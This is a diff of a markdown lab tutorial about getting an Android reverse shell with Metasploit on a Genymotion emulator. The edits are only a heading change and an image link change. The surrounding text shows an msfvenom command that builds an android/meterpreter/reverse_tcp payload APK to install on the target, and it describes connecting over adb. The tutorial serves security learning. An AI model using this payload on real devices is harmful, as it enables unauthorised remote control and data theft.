@@ -14,7 +14,7 @@ Its best-known sub-project is the open source Metasploit Framework, a tool for d
 
 3. Genymotion/Android device
 
-Exploitation to get an android reverse shell
+## Exploitation to get an android reverse shell
 Connect to the remote target device(genymotion/android) using adb
 
 ![](https://github.com/v1ns3c/Write-ups/blob/b8eb5b3375fe3ebeb7c3236309f3b684487479ba/Images/Documentations/Metasploit_for_Android/0_1.jpeg)
@@ -29,7 +29,7 @@ $ ./msfvenom -p android/meterpreter/reverse_tcp LHOST=<localhost ip> LPORT=4444 
 
 Install the apk generated on the target device(genymotion/android)
 
-![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/3.png)
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/3.jpeg)
 ![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/4.png)
 
 Go to ‘opt/metasploit-framework/bin’ and follow the steps to get the reverse shell
